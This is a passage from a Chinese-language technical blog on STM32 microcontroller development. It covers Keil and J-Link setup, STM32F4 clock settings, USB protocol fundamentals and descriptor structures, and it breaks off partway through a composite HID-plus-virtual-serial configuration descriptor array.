<p>在<code>Debug</code>选项卡右侧的<code>Use</code>中选择<code>J-LINK/J-TRACE Cortex</code>。完成后点击<code>Settings</code>，选择<code>Flash Download</code>选项卡，删除<code>Programming Algorithm</code>中的项目，点击<code>ADD</code>，添加第一项。另外，在<code>Debug</code>选项卡可以选择<code>Port</code>，可以是<code>Jtag</code>或<code>SW</code>，可根据下载器选择。完成后确定返回。</p>
<p>这里开始创建一个<code>main.c</code>和一个<code>main.h</code>文件。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// main.c</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;main.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    GPIO_InitTypeDef gpio;</span><br><span class="line">    <span class="built_in">RCC_APB2PeriphClockCmd</span>(RCC_APB2Periph_GPIOA, ENABLE);</span><br><span class="line">    gpio.GPIO_Mode = GPIO_Mode_Out_PP;</span><br><span class="line">    gpio.GPIO_Speed = GPIO_Speed_50MHz;</span><br><span class="line">    gpio.GPIO_Pin = GPIO_Pin_2;</span><br><span class="line">    <span class="built_in">GPIO_Init</span>(GPIOA, &amp;gpio);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">GPIO_ResetBits</span>(GPIOA, GPIO_Pin_2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// main.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MAIN_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAIN_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stm32f10x.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>之后打开<code>Manage Project Items</code>按钮，编辑项目目录。这可以按照项目目录创建<code>Groups</code>，并在对应的<code>Files</code>中添加相应<code>.c</code>文件。</p>
<p>最后编译下载查看效果。</p>
<h3 id="STM32F4"><a href="#STM32F4" class="headerlink" title="STM32F4"></a>STM32F4</h3><h4 id="宏定义"><a href="#宏定义" class="headerlink" title="宏定义"></a>宏定义</h4><p>USE_STDPERIPH_DRIVER 使用标准库<br>STM32F40_41xxx 选择芯片型号<br>ARM_MATH_CM4 使用<code>ARM MATH</code>库，调用片内DSP</p>
<h4 id="修改时钟源"><a href="#修改时钟源" class="headerlink" title="修改时钟源"></a>修改时钟源</h4><p>由于STM32F4默认HSE为25MHz，而一般的生产厂家配置的是8MHz的晶振，因此默认情况下，程序跑不到168MHz，需要更改默认配置。</p>
<p>打开<code>system_stm32f4xx.c</code>，配置如下选项：</p>
<ol>
<li>找到<code>PLL Parameters</code>下的<code>#if defined(STM32F40_41xxx)</code></li>
<li>配置<code>PLL_M</code>由<code>25</code>改为<code>8</code></li>
<li>配置<code>PLL_N</code>保持为<code>336</code></li>
<li>配置<code>PLL_P</code>保持为<code>2</code></li>
</ol>
<p>打开<code>stm32f4xx.h</code>中定义<code>HSE_VALUE</code></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> HSE_VALUE 8000000</span></span><br></pre></td></tr></table></figure>


<h2 id="USB"><a href="#USB" class="headerlink" title="USB"></a>USB</h2><h3 id="USB-协议"><a href="#USB-协议" class="headerlink" title="USB 协议"></a>USB 协议</h3><p><a href="https://blog.csdn.net/songze_lee/article/details/77658094">USB 协议</a><br><a href="https://blog.csdn.net/u014647208/article/details/79994473">设备枚举</a></p>
<h4 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h4><p>物理层上，USB协议采用差分信号，使用两个数据线<code>D+</code>和<code>D-</code>。</p>
<p>(VOH&gt;2.8V, VOL&lt;0.3V)<br>信号 1, J状态：<code>D+&gt;VOH, D-&lt;VOL</code>  <code>(D+ = 1, D- = 0)</code><br>信号 0, K状态：<code>D+&lt;VOL, D-&gt;VOH</code>  <code>(D+ = 0, D- = 1)</code><br>Reset：<code>D+&lt;VOL, D-&lt;VOL, time&gt;10ms</code>  <code>(D+ = 0, D- = 0)</code><br>SE0状态：<code>(D+ = 0, D- = 1)</code><br>IDLE状态：空闲状态<br>Suspend：J状态保存3ms以上<br>SYNC：3个K J切换后跟随两位时间的K状态<br>Resume：20ms的K状态+低速EOP<br>SOP：从IDLE切换到K状态<br>EOP：持续2位时间的SE0信号，后跟随一位时间的J状态<br>Keep alive：低速EOP信号</p>
<p>主机通过设备在D+或D-上的1.5K上拉来检测设备的连接和断开事件，并由此判别设备的速度。</p>
<p>低速设备：<code>D-</code>被上拉。<br>高速，全速设备：<code>D+</code>被上拉。主机先把高速设备检测为全速设备，然后再通过“Chirp序列”的总线握手机制来识别高速和全速设备</p>
<h4 id="USB-连接与断开"><a href="#USB-连接与断开" class="headerlink" title="USB 连接与断开"></a>USB 连接与断开</h4><p>在连接时，当主机检测到某一个数据线电平拉高并保持了一段时间，就认为有设备连上来了。主机必需在驱动SE0状态以复位设备之前，立刻采样总线状态来判断设备的速度。</p>
<p>在断开时，HOST端的D+和D-数据线上的下拉电阻起作用，使得二者都在低电平，主机端看来就是个SE0状态。当数据线上的SE0状态持续一段时间了，就被主机认为是断开状态。</p>
<h4 id="数据传输"><a href="#数据传输" class="headerlink" title="数据传输"></a>数据传输</h4><p>USB采用NRZI（非归零编码）对发送的数据包进行编码：<br>输入数据0， 编码成“电平翻转”<br>输入数据1， 编码成“电平不变”</p>
<p>数据流中每6个连续的“1”，就要插入1个“0”，从而保证编码。接收方赋值解码NRZI码流，然后识别出填充位，并丢弃它们。</p>
<h4 id="USB-传输"><a href="#USB-传输" class="headerlink" title="USB 传输"></a>USB 传输</h4><p>传输又分为四种类型：批量传输、等时(同步)传输、中断传输、控制传输。USB传输数据先发数据低位再发高位数据。</p>
<p>一个传输有多个事务组成，一个事务由2或3个包组成。</p>
<h4 id="包"><a href="#包" class="headerlink" title="包"></a>包</h4><p>Packet分四大类： 命令 (Token) 、Packet 帧首 (Start of Frame) 、Packet 数据 (Data) 、Packet 握手 (Handshake) </p>
<p>包的组成：</p>
<ul>
<li>SOP</li>
<li>SYNC</li>
<li>Packet Content</li>
<li>PID：PID4<del>7是PID0</del>4的取反，用来校验PID。</li>
<li>地址：设备地址和端点地址，设备地址7位，端点地址4位。</li>
<li>帧号：11位，主机发出一个帧，帧号+1。达到7FFH时重新计数。</li>
<li>数据：长度从0到1024Byte不等。</li>
<li>CRC</li>
<li>EOP</li>
</ul>
<table>
<thead>
<tr>
<th>PID 类型</th>
<th>PID 名称</th>
<th>Package 种类</th>
</tr>
</thead>
<tbody><tr>
<td>Token 令牌</td>
<td>OUT&#x2F;INT&#x2F;SETUP&#x2F;SOF</td>
<td>令牌包，帧首包</td>
</tr>
<tr>
<td>Data 数据</td>
<td>DATA0&#x2F;DATA1&#x2F;DATA2&#x2F;MDATA</td>
<td>数据包</td>
</tr>
<tr>
<td>Handshake 握手</td>
<td>ACK&#x2F;NAK&#x2F;STALL&#x2F;NYET</td>
<td>握手包</td>
</tr>
<tr>
<td>Special 特殊</td>
<td>PRE&#x2F;ERR&#x2F;SPLIT&#x2F;PING</td>
<td>无</td>
</tr>
</tbody></table>
<img src="/2020/02/12/%E7%89%A9%E8%81%94%E7%BD%91/STM32/usb-pid.png" class="" title="USB PID">

<p>令牌包：用来启动一次USB传输。没有帧号和数据部分。</p>
<p>输出（OUT）令牌包：用来通知设备将要输出一个数据包<br>输入（IN）令牌包：用来通知设备返回一个数据包<br>建立（SETUP）令牌包：只用在控制传输中，和输出令牌包作用一样，也是通知设备将要输出一个数据包，两者区别在于:<br>SETUP令牌包后只使用DATA0数据包，且只能发送到设备的控制端点，并且设备必须要接收，而OUT令牌包没有这些限制</p>
<p>帧起始包：在每帧（或微帧）开始时发送，以广播的形式发送，所有USB全速设备和高速设备都可以接收到SOF包。没有地址和数据部分。</p>
<p>数据包：没有地址和帧号。</p>
<p>握手包：只有PID部分。</p>
<h4 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h4><p>事务可分为3类：<br>Setup transaction：主机用来向设备发送控制命令<br>Data IN transaction：主机用来从设备读取数据<br>Data OUT transaction：主机用来向设备发送数据 </p>
<p>包组成：<br>Token packet：总是由主机发出<br>Data packet：包含此次transaction的数据负载 </p>
<h4 id="传输"><a href="#传输" class="headerlink" title="传输"></a>传输</h4><p>四种传输类型：</p>
<p>批量(大容量数据)传输(Bulk Transfers): 非周期性，突发  <br>大容量数据的通信，数据可以占用任意带宽，并容忍延迟 。如USB打印机、扫描仪、大容量储存设备等 </p>
<p>中断传输(Interrupt Transfers): 周期性，低频率<br>允许有限延迟的通信 如人机接口设备（HID）中的鼠标、键盘、轨迹球等</p>
<p>等时(同步)传输(Isochronous Transfers): 周期性 <br>持续性的传输，用于传输与时效相关的信息，并且在数据中保存时间戳的信息 ,如音频视频设备</p>
<p>控制传输(Control Transfers): 非周期性，突发<br>用于命令和状态的传输</p>
<h5 id="批量传输"><a href="#批量传输" class="headerlink" title="批量传输"></a>批量传输</h5><p>批量输出事务</p>
<p>(1)主机先发出一个OUT令牌包（包含设备地址，端点号）</p>
<p>(2)然后再发送一个DATA包，这时地址和端点匹配的设备就会收下这个数据包，主机切换到接收模式，等待设备返回握手包</p>
<p>（3）设备解码令牌包，数据包都准确无误，并且有足够的缓冲区来保存数据后就会使用ACK&#x2F;NYET握手包来应答主机（只有高速模式才有NYET握手包，他表示本次数据成功接收，但是没有能力接收下一次传输），如果没有足够的缓冲区来保存数据，就返回NAC，告诉主机目前没有缓冲区可用，主机会在稍后时间重新该批量传输事务。如果设备检查到数据正确，但端点处于挂起状态，返回STALL。如果检测到有错误（如校验错误，位填充错误），则不做任何响应，让主机等待超时。</p>
<p>批量输入事务</p>
<p>(1)主机首先发送一个IN令牌包（包含设备地址，端点号）</p>
<p>（2）主机切换到接收数据状态等待设备返回数据。如果设备检测到错误，不做任何响应，主机等待超时。如果此时有地址和端点匹配的设备，并且没有检测到错误，则该设备作出反应：设备有数据需要返回，就将一个数据包放在总线上；如果没有数据需要返回，设备返回NAK响应主机；如果该端点处于挂起状态，设备返回STALL。如果主机收到设备发送的数据包并解码正确后，使用ACK握手包应答设备。如果主机检测到错误，则不做任何响应，设备会检测到超时。注意：USB协议规定，不允许主机使用NAK来拒绝接收数据包。主机收到NAK，知道设备暂时没有数据返回，主机会在稍后时间重新该批量输入事务。</p>
<p>PING令牌包</p>
<p>不发送数据，直到等待设备的握手包。</p>
<h5 id="中断传输"><a href="#中断传输" class="headerlink" title="中断传输"></a>中断传输</h5><p>中断传输是一种保证查询频率的传输。中断端点在端点描述符中要报告它的查询间隔，主机会保证在小于这个时间间隔的范围内安排一次传输。</p>
<h5 id="等时传输"><a href="#等时传输" class="headerlink" title="等时传输"></a>等时传输</h5><p>等时（同步）传输用在数据量大、对实时性要求高的场合，如音频设备，视频设备等，这些设备对数据的延迟很敏感。对于音频或视频设备数据的100%正确性要求不高，少量的数据错误是可以容忍的，主要是保证数据不能停顿，所以等时传输是不保证数据100%正确的。当数据错误时，不再重传操作。因此等时传输没有应答包，数据是否正确，由数据的CRC校验来确认。</p>
<h5 id="控制传输"><a href="#控制传输" class="headerlink" title="控制传输"></a>控制传输</h5><p>控制传输可分为三个过程：<br>（1）建立过程<br>（2）数据过程（可选）<br>（3）状态过程</p>
<p>每个USB设备都必须有控制端点，支持控制传输来进行命令和状态的传输。USB主机驱动将通过控制传输与USB设备的控制端点通信，完成USB设备的枚举和配置</p>
<p>控制传输是双向的传输，必须有IN和OUT两个方向上的特定端点号的控制端点来完成两个方向上的控制传输 </p>
<h4 id="USB-标准请求"><a href="#USB-标准请求" class="headerlink" title="USB 标准请求"></a>USB 标准请求</h4><p>标准请求结构体</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">请求类型：</span></span><br><span class="line"><span class="comment">D7：数据传输方向，0 Host -&gt; Device, 1 Device -&gt; Host</span></span><br><span class="line"><span class="comment">D65：请求类型，0 标准，1 类，2 厂商，3 保留</span></span><br><span class="line"><span class="comment">D43210：请求的接收者，0 设备，1 接口，2 端点，3 其他，其余保留</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">u8  bmRequestType;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 请求代码</span></span><br><span class="line">u8  bRequest;</span><br><span class="line">u16 wValue;</span><br><span class="line">u16 wIndex;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数据过程所需传输的字节数</span></span><br><span class="line">u16 wLength;</span><br></pre></td></tr></table></figure>

<p>请求代码<code>bRequest</code>枚举：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">GET_STATUS      = <span class="number">0</span>,</span><br><span class="line">CLEAR_FEATURE   = <span class="number">1</span>,</span><br><span class="line">SET_FEATURE     = <span class="number">3</span>,</span><br><span class="line">SET_ADDRESS     = <span class="number">5</span>,</span><br><span class="line">GET_DESCRIPTOR  = <span class="number">6</span>,</span><br><span class="line">SET_DESCRIPTOR  = <span class="number">7</span>,</span><br><span class="line">GET_CONFIGURATION  = <span class="number">8</span>,</span><br><span class="line">SET_CONFIGURATION  = <span class="number">9</span>,</span><br><span class="line">GET_INTERFACE   = <span class="number">10</span>,</span><br><span class="line">SET_INTERFACE   = <span class="number">11</span>,</span><br><span class="line">SYNCH_FRAME     = <span class="number">12</span></span><br></pre></td></tr></table></figure>

<h4 id="设备枚举和描述符"><a href="#设备枚举和描述符" class="headerlink" title="设备枚举和描述符"></a>设备枚举和描述符</h4><p>当一个USB设备插入主机后，会有以下活动：</p>
<ul>
<li>供电</li>
<li>复位</li>
<li>获取设备描述符前8 Bytes</li>
<li>复位</li>
<li>分配地址</li>
<li>获取设备描述符</li>
<li>获取Configuration Descriptor</li>
<li>获取String Descriptor</li>
<li>配置</li>
</ul>
<p>配置描述符：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">usb_config_descriptor</span> &#123;</span><br><span class="line">    __u8  bLength;</span><br><span class="line">    __u8  bDescriptorType;</span><br><span class="line"> </span><br><span class="line">    __le16 wTotalLength;</span><br><span class="line">    __u8  bNumInterfaces;</span><br><span class="line">    __u8  bConfigurationValue;</span><br><span class="line">    __u8  iConfiguration;</span><br><span class="line">    __u8  bmAttributes;</span><br><span class="line">    __u8  bMaxPower;</span><br><span class="line">&#125; __attribute__ ((packed));</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> USB_DT_CONFIG_SIZE        9</span></span><br></pre></td></tr></table></figure>

<p>接口描述符：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">usb_interface_descriptor</span> &#123;</span><br><span class="line">    __u8  bLength;</span><br><span class="line">    __u8  bDescriptorType;</span><br><span class="line"> </span><br><span class="line">    __u8  bInterfaceNumber;</span><br><span class="line">    __u8  bAlternateSetting;</span><br><span class="line">    __u8  bNumEndpoints;</span><br><span class="line">    __u8  bInterfaceClass;</span><br><span class="line">    __u8  bInterfaceSubClass;</span><br><span class="line">    __u8  bInterfaceProtocol;</span><br><span class="line">    __u8  iInterface;</span><br><span class="line">&#125; __attribute__ ((packed));</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> USB_DT_INTERFACE_SIZE        9</span></span><br></pre></td></tr></table></figure>


<p>类描述符：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">usb_device_descriptor</span> &#123;</span><br><span class="line">    __u8  bLength;</span><br><span class="line">    __u8  bDescriptorType;</span><br><span class="line"> </span><br><span class="line">    __le16 bcdUSB;</span><br><span class="line">    __u8  bDeviceClass;</span><br><span class="line">    __u8  bDeviceSubClass;</span><br><span class="line">    __u8  bDeviceProtocol;</span><br><span class="line">    __u8  bMaxPacketSize0;</span><br><span class="line">    __le16 idVendor;</span><br><span class="line">    __le16 idProduct;</span><br><span class="line">    __le16 bcdDevice;</span><br><span class="line">    __u8  iManufacturer;</span><br><span class="line">    __u8  iProduct;</span><br><span class="line">    __u8  iSerialNumber;</span><br><span class="line">    __u8  bNumConfigurations;</span><br><span class="line">&#125; __attribute__ ((packed));</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> USB_DT_DEVICE_SIZE        18</span></span><br></pre></td></tr></table></figure>


<p>端点描述符：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">usb_endpoint_descriptor</span> &#123;</span><br><span class="line">    __u8  bLength;</span><br><span class="line">    __u8  bDescriptorType;</span><br><span class="line"> </span><br><span class="line">    __u8  bEndpointAddress;</span><br><span class="line">    __u8  bmAttributes;</span><br><span class="line">    __le16 wMaxPacketSize;</span><br><span class="line">    __u8  bInterval;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* <span class="doctag">NOTE:</span>  these two are _only_ in audio endpoints. */</span></span><br><span class="line">    <span class="comment">/* use USB_DT_ENDPOINT*_SIZE in bLength, not sizeof. */</span></span><br><span class="line">    __u8  bRefresh;</span><br><span class="line">    __u8  bSynchAddress;</span><br><span class="line">&#125; __attribute__ ((packed));</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> USB_DT_ENDPOINT_SIZE        7</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Audio extension */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> USB_DT_ENDPOINT_AUDIO_SIZE    9</span></span><br></pre></td></tr></table></figure>

<p>字符串描述符：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">usb_string_descriptor</span> &#123;</span><br><span class="line">    __u8  bLength;</span><br><span class="line">    __u8  bDescriptorType;</span><br><span class="line"> </span><br><span class="line">    __le16 wData[<span class="number">1</span>];        <span class="comment">/* UTF-16LE encoded */</span></span><br><span class="line">&#125; __attribute__ ((packed));</span><br></pre></td></tr></table></figure>

<p>在STM32的代码中，USB配置描述符，接口描述符，端点描述符这3个被整合为一个USB描述符，然后还是叫做USB配置描述符。例如（使用USB复合设备）：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* All Descriptors (配置描述符, 接口描述符, 端点描述符, 类描述符 */</span></span><br><span class="line"><span class="type">const</span> <span class="type">uint8_t</span> Composite_ConfigDescriptor[CUSTOMHID_SIZ_CONFIG_DESC] =</span><br><span class="line">&#123;</span><br><span class="line">  配置描述符   <span class="comment">//Configuration Descriptor 只能有1个</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*功能1——VCP虚拟串口接口*/</span></span><br><span class="line">  IAD描述符    <span class="comment">//复合设备才有 在单接口的设备这个可以不要</span></span><br><span class="line">  接口<span class="number">1</span>描述符   <span class="comment">//Interface Descriptor</span></span><br><span class="line">  类描述符    <span class="comment">//Class Desdriptor</span></span><br><span class="line">  端点描述符  <span class="comment">//Endpoint Descriptor</span></span><br><span class="line">  </span><br><span class="line">  接口<span class="number">2</span>描述符   <span class="comment">//Interface Descriptor</span></span><br><span class="line">  类描述符    <span class="comment">//Class Desdriptor</span></span><br><span class="line">  端点描述符  <span class="comment">//Endpoint Descriptor</span></span><br><span class="line">  端点描述符  <span class="comment">//Endpoint Descriptor如果此接口有多个端点，可接着添加端点描述符</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*如果有多个接口 下面还可以继续添加以下描述符*/</span></span><br><span class="line">  <span class="comment">/*功能2——HID键盘*/</span></span><br><span class="line">  IAD描述符    <span class="comment">//复合设备才有 在单接口的设备这个可以不要</span></span><br><span class="line">  接口描述符   <span class="comment">//Interface Descriptor</span></span><br><span class="line">  类描述符    <span class="comment">//Class Desdriptor</span></span><br><span class="line">  端点描述符  <span class="comment">//Endpoint Descriptor</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*如果有多个接口 下面还可以继续添加以下描述符*/</span></span><br><span class="line">  <span class="comment">/*接口3 */</span></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">uint8_t</span> Composite_ConfigDescriptor[CUSTOMHID_SIZ_CONFIG_DESC] =</span><br><span class="line">&#123;</span><br><span class="line">     <span class="number">0x09</span>, <span class="comment">/* bLength: Configuration Descriptor size */</span></span><br><span class="line">    USB_CONFIGURATION_DESCRIPTOR_TYPE, <span class="comment">/* bDescriptorType: Configuration */</span></span><br><span class="line">    CUSTOMHID_SIZ_CONFIG_DESC,</span><br><span class="line">    <span class="comment">/* wTotalLength: Bytes returned */</span></span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x03</span>,         <span class="comment">/* bNumInterfaces: 3 interface 共3个接口 CDC 2个 HID一个*/</span></span><br><span class="line">    <span class="number">0x01</span>,         <span class="comment">/* bConfigurationValue: Configuration value */</span></span><br><span class="line">    <span class="number">0x00</span>,         <span class="comment">/* iConfiguration: Index of string descriptor describing</span></span><br><span class="line"><span class="comment">                                 the configuration*/</span></span><br><span class="line">    <span class="number">0xC0</span>,         <span class="comment">/* bmAttributes: Self powered */</span></span><br><span class="line">    <span class="number">0x32</span>,         <span class="comment">/* MaxPower 100 mA: this current is used for detecting Vbus */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*************************************功能1 HID键盘**************************************/</span></span><br><span class="line">    <span class="comment">/*IAD描述符*/</span></span><br><span class="line">    <span class="number">0x08</span>,   <span class="comment">//bLength：IAD描述符大小 </span></span><br><span class="line">    <span class="number">0x0B</span>,   <span class="comment">//bDescriptorType：IAD描述符类型</span></span><br><span class="line">    <span class="number">0x00</span>,   <span class="comment">//bFirstInterface：功能1 HID键盘的第一个接口描述符是在总的配置描述符中的第几个从0开始数</span></span><br><span class="line">    <span class="number">0x01</span>,   <span class="comment">//bInferfaceCount：功能1 HID键盘有1个接口描述符</span></span><br><span class="line">    <span class="number">0x03</span>,   <span class="comment">//bFunctionClass：同单HID功能时，设备符中的bDeviceClass</span></span><br><span class="line">    <span class="number">0x00</span>,   <span class="comment">//bFunctionSubClass：同单HID功能时，设备符中的bDeviceSubClass</span></span><br><span class="line">    <span class="number">0x01</span>,   <span class="comment">//bFunctionProtocol：同单HID功能时，设备符中的bDeviceProtocol</span></span><br><span class="line">    <span class="number">0x00</span>,   <span class="comment">//iFunction：字符串描述中关于此设备的索引(个人理解是一个字符串描述符中有比如0~5是功能1的字符串，</span></span><br><span class="line">            <span class="comment">//6~10是功能2的字符串,如果是功能2的话，此值为6)</span></span><br><span class="line">    </span><br><span class="line">      </span><br><span class="line">    <span class="comment">/************** Descriptor of Custom HID interface ****************/</span></span><br><span class="line">    <span class="comment">/* 09 */</span></span><br><span class="line">    <span class="number">0x09</span>,         <span class="comment">/* bLength: Interface Descriptor size */</span></span><br><span class="line">    USB_INTERFACE_DESCRIPTOR_TYPE,<span class="comment">/* bDescriptorType: Interface descriptor type */</span></span><br><span class="line">    <span class="number">0x00</span>,         <span class="comment">/* bInterfaceNumber: Number of Interface */</span> <span class="comment">//&lt;接口 0&gt;</span></span><br><span class="line">    <span class="number">0x00</span>,         <span class="comment">/* bAlternateSetting: Alternate setting */</span></span><br><span class="line">    <span class="number">0x02</span>,         <span class="comment">/* bNumEndpoints */</span></span><br><span class="line">    <span class="number">0x03</span>,         <span class="comment">/* bInterfaceClass: HID */</span></span><br><span class="line">    <span class="number">0x01</span>,         <span class="comment">/* bInterfaceSubClass : 1=BOOT, 0=no boot */</span></span><br><span class="line">    <span class="number">0x01</span>,         <span class="comment">/* nInterfaceProtocol : 0=none, 1=keyboard, 2=mouse */</span></span><br><span class="line">    <span class="number">0</span>,            <span class="comment">/* iInterface: Index of string descriptor */</span></span><br><span class="line">    <span class="comment">/******************** Descriptor of Custom HID HID ********************/</span></span><br><span class="line">    <span class="comment">/* 18 */</span></span><br><span class="line">    <span class="number">0x09</span>,         <span class="comment">/* bLength: HID Descriptor size */</span></span><br><span class="line">    HID_DESCRIPTOR_TYPE, <span class="comment">/* bDescriptorType: HID */</span></span><br><span class="line">    <span class="number">0x10</span>,         <span class="comment">/* bcdHID: HID Class Spec release number */</span></span><br><span class="line">    <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0x00</span>,         <span class="comment">/* bCountryCode: Hardware target country */</span></span><br><span class="line">    <span class="number">0x01</span>,         <span class="comment">/* bNumDescriptors: Number of HID class descriptors to follow */</span></span><br><span class="line">    <span class="number">0x22</span>,         <span class="comment">/* bDescriptorType */</span></span><br><span class="line">    CUSTOMHID_SIZ_REPORT_DESC,</span><br><span class="line">    <span class="comment">//KEYBOARD_SIZ_REPORT_DESC,/* wItemLength: Total length of Report descriptor */</span></span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">/******************** Descriptor of Custom HID endpoints ******************/</span></span><br><span class="line">    <span class="comment">/* 27 */</span></span><br><span class="line">    <span class="number">0x07</span>,          <span class="comment">/* bLength: Endpoint Descriptor size */</span></span><br><span class="line">    USB_ENDPOINT_DESCRIPTOR_TYPE, <span class="comment">/* bDescriptorType: */</span></span><br><span class="line">    <span class="number">0x84</span>,          <span class="comment">/* bEndpointAddress: Endpoint Address (IN) */</span></span><br><span class="line">    <span class="number">0x03</span>,          <span class="comment">/* bmAttributes: Interrupt endpoint */</span></span><br><span class="line">    <span class="number">0x08</span>,          <span class="comment">/* wMaxPacketSize: 8 Bytes max */</span></span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x20</span>,          <span class="comment">/* bInterval: Polling Interval (32 ms) */</span></span><br><span class="line">    <span class="comment">/* 34 */</span>	</span><br><span class="line">    <span class="number">0x07</span>,	<span class="comment">/* bLength: Endpoint Descriptor size */</span></span><br><span class="line">    USB_ENDPOINT_DESCRIPTOR_TYPE,	<span class="comment">/* bDescriptorType: */</span></span><br><span class="line">    <span class="number">0x04</span>,	<span class="comment">/* bEndpointAddress:Endpoint Address (OUT) */</span></span><br><span class="line">    <span class="number">0x03</span>,	<span class="comment">/* bmAttributes: Interrupt endpoint */</span></span><br><span class="line">    <span class="number">0x01</span>,	<span class="comment">/* wMaxPacketSize: 1 Bytes max  */</span></span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x20</span>,	<span class="comment">/* bInterval: Polling Interval (20 ms) */</span></span><br><span class="line">    <span class="comment">/* 41 */</span></span><br><span class="line">    <span class="comment">/********************************功能2 VCP虚拟串口*****************************/</span></span><br><span class="line">    <span class="comment">/*IAD描述符*/</span></span><br><span class="line">    <span class="comment">/* Interface Association Descriptor(IAD Descriptor)  */</span> </span><br><span class="line">    <span class="number">0x08</span>,   <span class="comment">/*  bLength  */</span></span><br><span class="line">    <span class="number">0x0B</span>,   <span class="comment">/*  bDescriptorType*/</span></span><br><span class="line">    <span class="number">0x01</span>,   <span class="comment">/*  bFirstInterface*/</span></span><br><span class="line">    <span class="number">0x02</span>,   <span class="comment">/*  bInterfaceCount*/</span></span><br><span class="line">    <span class="number">0x02</span>,   <span class="comment">/*  bFunctionClass --CDC*/</span></span><br><span class="line">    <span class="number">0x02</span>,   <span class="comment">/*  bFunctionSubClass*/</span></span><br><span class="line">    <span class="number">0x01</span>,   <span class="comment">/*  bFunctionProtocoll*/</span></span><br><span class="line">    <span class="number">0x00</span>,   <span class="comment">/*  iFunction */</span></span><br><span class="line">    </span><br><span class="line">     <span class="comment">/**VCP虚拟串口**/</span></span><br><span class="line">    <span class="comment">/*Interface Descriptor接口描述符*/</span></span><br><span class="line">    <span class="number">0x09</span>,   <span class="comment">/* bLength: Interface Descriptor size */</span></span><br><span class="line">    USB_INTERFACE_DESCRIPTOR_TYPE,  <span class="comment">/* bDescriptorType: Interface */</span></span><br><span class="line">    <span class="comment">/* Interface descriptor type */</span></span><br><span class="line">    <span class="number">0x01</span>,   <span class="comment">/* bInterfaceNumber: Number of Interface */</span>   <span class="comment">//&lt;接口 1&gt;</span></span><br><span class="line">    <span class="number">0x00</span>,   <span class="comment">/* bAlternateSetting: Alternate setting */</span></span><br><span class="line">    <span class="number">0x01</span>,   <span class="comment">/* bNumEndpoints: One endpoints used 该接口非0端点数*/</span></span><br><span class="line">    <span class="number">0x02</span>,   <span class="comment">/* bInterfaceClass: Communication Interface Class */</span></span><br><span class="line">    <span class="number">0x02</span>,   <span class="comment">/* bInterfaceSubClass: Abstract Control Model */</span></span><br><span class="line">    <span class="number">0x01</span>,   <span class="comment">/* bInterfaceProtocol: Common AT commands */</span></span><br><span class="line">    <span class="number">0x00</span>,   <span class="comment">/* iInterface: */</span></span><br><span class="line">    <span class="comment">/*Header Functional Descriptor类描述符*/</span></span><br><span class="line">    <span class="number">0x05</span>,   <span class="comment">/* bLength: Endpoint Descriptor size */</span></span><br><span class="line">    <span class="number">0x24</span>,   <span class="comment">/* bDescriptorType: CS_INTERFACE */</span></span><br><span class="line">    <span class="number">0x00</span>,   <span class="comment">/* bDescriptorSubtype: Header Func Desc */</span></span><br><span class="line">    <span class="number">0x10</span>,   <span class="comment">/* bcdCDC: spec release number */</span></span><br><span class="line">    <span class="number">0x01</span>,</span><br><span class="line">    <span class="comment">/*Call 